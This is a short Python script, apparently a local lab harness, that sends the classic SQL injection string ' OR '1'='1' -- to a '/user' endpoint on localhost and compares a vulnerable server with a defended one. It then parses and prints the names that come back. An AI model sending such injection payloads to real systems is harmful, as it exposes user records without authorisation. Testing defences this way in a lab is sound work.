import argparse, requests, urllib.parse

BASE_VULN = "http://127.0.0.1:5001"
BASE_DEF  = "http://127.0.0.1:5002"


# --- CLI arguments ---
parser = argparse.ArgumentParser()
parser.add_argument("--url", help="Target user endpoint URL (overrides defaults)")
parser.add_argument("--defended", action="store_true", help="Target defended agent instead of vulnerable")
args = parser.parse_args()

# --- Defaults ---
if args.url:
    target_url = f"{args.url}/user"
elif args.defended:
    target_url = f"{BASE_DEF}/user"
else:
    target_url = f"{BASE_VULN}/user"
import requests, urllib.parse

# Classic SQLi bypass

def _extract_items(obj):
    # Accept: {"result":[...]}, or [...] (list of strings OR list of dicts)
    if isinstance(obj, dict) and "result" in obj:
        obj = obj["result"]
    if isinstance(obj, list):
        return obj
    raise AssertionError(f"Unexpected response shape: {obj!r}")

def _to_names(seq):
    # Map ["alice"] or [{"name":"alice"}] -> ["alice"]
    out = []
    for item in seq:
        if isinstance(item, str):
            out.append(item)
        elif isinstance(item, dict) and "name" in item:
            out.append(item["name"])
    return out

sqli = "' OR '1'='1' -- "
r = requests.get(target_url, params={"name": sqli})
items = _extract_items(r.json())
names = _to_names(items)
#name = "' OR '1'='1 --"
#r = requests.get(url, params={"name": name}, timeout=5)
print("Status:", r.status_code, "Body:", r.text)
